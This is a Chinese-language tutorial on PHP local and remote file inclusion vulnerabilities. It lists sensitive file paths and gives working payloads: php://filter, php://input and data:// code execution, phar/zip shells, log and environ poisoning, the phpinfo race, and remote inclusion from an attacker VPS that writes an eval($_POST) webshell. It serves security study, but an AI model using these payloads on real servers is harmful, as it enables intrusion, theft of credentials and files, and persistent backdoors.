# 文件包含漏洞

很多脚本语言支持使用文件包含,也就是我们所说的「文件包含函数」，如果我们没有对文件的来源进行严格的审查，不光可以包含我们预先指定的文件，也可以包含我们服务器内部的其他文件，也就是开发者在编写代码的时候触犯的逻辑性的错误就可能会导致敏感文件读取漏洞和其它类型的漏洞。

在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。

文件包含漏洞共分为两大类，本地文件包含和远程文件包含。

## PHP中，文件包含使用的函数

    include()：
     执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行。
     
    require()：
    只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本。
     
    include_once()和require_once()：
    include_once()这个函数和include()基本相同，区别是在于若文件中代码已被包含则不会再次包含。
    require_once()：和require()也基本一样，区别同样在于若文件中代码已被包含则不会再次包含。
    
## PHP中，文件包含涉及的配置

    allow_url_fopen ：
    on 默认开启，该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。
    使用file，fopen或file_get_contents函数打开远程url时，
    需要PHP配置中(php.ini)将allow_url_fopen的值设置为On。
    
    allow_url_include：
    off 默认关闭，该选项为on便是允许 包含URL 对象文件等。
    从PHP5.2开始allow_url_include就默认为Off了
    
## 常见敏感信息路径

    Windows系统
    c:\boot.ini // 查看系统版本
    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
    c:\windows\repair\sam // 存储Windows系统初次安装的密码
    c:\ProgramFiles\mysql\my.ini // MySQL配置
    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
    c:\windows\php.ini // php 配置信息
     
    Linux/Unix系统
    /etc/passwd // 账户信息
    /etc/shadow // 账户密码文件
    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
    /usr/local/app/php5/lib/php.ini // PHP相关配置
    /etc/httpd/conf/httpd.conf // Apache配置文件
    /etc/my.conf // mysql 配置文件
    
## 本地文件包含

### 无限制本地文件包含
    
#### 利用协议

##### http协议

举例

    ?file=http://www.攻击者IP.com/1.txt
    
1.txt的内容为`<?php system('tac flag.php');?>`

##### php协议

对allow_url_fopen和allow_url_include是否要求开启

    协议              作用                      allow_url_fopen     allow_url_include
    php://stdin     只读的协议                       on/off              on
    php://stdout	只写的协议                       on/off              on/off
    php ://stderr	只写的协议                       on/off              on/off
    php://filter	本地磁盘文件进行读取              on                  on/off
    php://input     可以访问请求的原始数据的只读流     on/off              on
    php://memory	                                                    on
    php://temp	                                                    on

举例

php://filter 可以利用它进行任意文件读取

    ?file=php://filter/read=convert.base64-encode/resource=flag.php
    
得到的结果要用base64解码

php://input 可以直接读取到POST上没有经过解析的原始数据，将post请求中的数据作为PHP代码执行。

不过在enctype="multipart/form-data"的时候php://input 是无效的。

    ?file=php://input post:<?php system('tac flag.php');?>
    
##### data协议

data://伪协议 是执行文件的包含方法包含了你的输入流

前提

allow_url_fopen ：on，allow_url_include：on

举例

    ?file=data://text/plain,<?=system('tac flag.*');?>
    
    ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
    
##### phar协议

这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压

> 注意：PHP > =5.3.0 压缩包需要是zip协议压缩，rar不行

用法

    phar://压缩包/内部文件
    
举例

    ?file=phar://xxx.png（压缩包）/shell.php （内部文件）
    
##### zip协议

zip伪协议和phar协议类似，但是用法不一样。

用法

    zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
    
举例

    ?file=zip://xxx.png#shell.php
    
##### file协议

访问本地文件系统

举例

    file:// [文件的绝对路径和文件名]
    ?file=/etc/passwd

#### 包含图片

    上传的图片中写入恶意代码，然后用 LFI（Local File Inclusion） 包含调用，就会执行图片里的PHP代码
    
### session文件包含

#### 前提

session的存储位置可以获取

session中的内容可以被控制，传入恶意代码

> 其中session位置的获取有两种方式
>
> 通过phpinfo的信息可以获取到session的存储位置
>
> 也可以通过猜测，因为就那几个固定的存储位置
>
> 例如：/var/lib/php5/sessions
>
> /var/lib/php7/sessions
>
> /var/lib/php/sessions
>
> /var/lib/php/sess_PHPSESSID
>
> /var/lib/php/sess_PHPSESSID
>
> /tmp/sess_PHPSESSID
>
> /tmp/sessions/sess_PHPSESSID
>
> session的文件名格式为`sess_[phpsessid]`。而phpsessid在发送的请求的cookie字段中可以看到。

### 访问日志

#### 前提

需要知道服务器日志的存储路径，且日志文件可读。

#### 常见默认存储路径

1.apache+Linux日志默认路径：/etc/httpd/logs/accesslog或/var/log/httpd/accesslog

2.apache+win2003日志默认路径：D:\xampp\apache\logs\access.log、D:\xampp\apache\logs\error.log

3.IIS6.0+win2003默认日志文件：C:\WINDOWS\system32\Logfiles

4.IIS7.0+win2003 默认日志文件：%SystemDrive%\inetpub\logs\LogFiles

5.nginx 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为/usr/local/nginx,那日志目录就是在/usr/local/nginx/logs下面

#### 利用

1.多数情况，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在/etc/httpd/logs/下。

2.但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。

3.正常的php代码已经写入了 /etc/httpd/logs/access.log。然后包含即可执行代码。

4.但有的时候，log的存放地址会被更改。这个时候可以通过读取相应的配置文件后，再进行包含。
中间件默认配置文件存放路径：

> 1.apache+linux 默认配置文件 /etc/httpd/conf/httpd.conf或/etc/init.d/httpd
>
> 2.IIS6.0+win2003 配置文件  C:/Windows/system32/inetsrv/metabase.xml
>
> 3.IIS7.0+WIN 配置文件  C:\Windows\System32\inetsrv\config\applicationHost.config

### SSH log

#### 前提

需要知道ssh-log的位置，且可读。

#### 默认路径

1./var/log/auth.log

2./var/log/secure

#### 利用

1.用ssh连接：

    ssh ‘<?php phpinfo(); ?>’@remotehost
    
之后会提示输入密码，随便输入就可以。

2.然后利用文件包含，包含日志文件

### environ文件

environ文件默认位置：proc/self/environ

#### 前提

1.php以cgi方式运行，这样environ才会保持UA头。

2.environ文件存储位置已知，且有权限访问environ文件。

#### 利用

1.proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。

### phpinfo

#### 前提

存在phpinfo页面且存在文件包含漏洞

#### 原理

1.当我们给PHP发送POST数据包时，如果数据包里包含文件区块，PHP就会将文件保存成一个临时文件，路径通常为：`/tmp/php[6个随机字符]`,这个临时文件，在请求结束后就会被删除。

2.因为phpinfo页面会将请求上下文中的所有变量打出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，就可以在返回包里找到临时文件名，也就是$_FILES变量中的内容。

#### 利用

1.首先我们使用[vulhub的脚本](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)，他可以实现包含临时文件，利用文件包含来执行任意命令。

那么为啥vulhub的脚本是如何做到在临时脚本文件删除前去包含的呢，其实就是用到了条件竞争，具体流程大致如下：

1.首先发送包含webshell的数据包给phpinfo页面，并用大量的垃圾数据将header和get等位置填满。

2.因phpinfo页面会将所有数据打印出来，第一个步骤中的垃圾数据就会将phpinfo页面撑的非常大。而php默认输出缓冲区大小为4096，也可以理解为php每次返回4096个字节给socket连接。

3.所以，这里直接操作原生socket，每次读取4096个字节。只要我们读取到字节里包含临时文件名，就立刻发送文件包含漏洞利用的数据包。因为第一个数据包的socket连接没有结束，所以临时文件还没有删除，我们就可以文件包含成功。

### 有限制本地文件包含

举例

包含的文件后面添加上文件后缀名

#### %00截断

##### 条件

    magic_quotes_gpc = Off php版本<5.3.4
    如果为on，%00会被转义，以至于无法截断。

#### 路径长度截断

##### 条件

    windows，点号需要长于256；linux，长于4096 
    Windows下目录最大长度为256字节，超出的部分会被丢弃
    Linux下目录最大长度为4096字节，超出的部分会被丢弃

## 远程文件包含

### 前提

远程文件包含需要allow_url_fopen和allow_url_include都开启

### 无限制远程文件包含

通过远程文件包含漏洞，包含shell.txt可以解析

举例：

    ?file=http://攻击者的VPS/shell.txt

shell.txt的内容

    <?php
        fputs(fopen('./shell.php','w'),'<?php @eval($_POST[aaa]) ?>');
    ?>
    
### 有限制远程文件包含漏洞绕过

举例

    <?php include($_GET['filename'] . ".html"); ?>

代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀

可以通过  ？# 空格 点点点点点点*n 绕过，也可以直接burp爆破尝试支持的绕过符号。

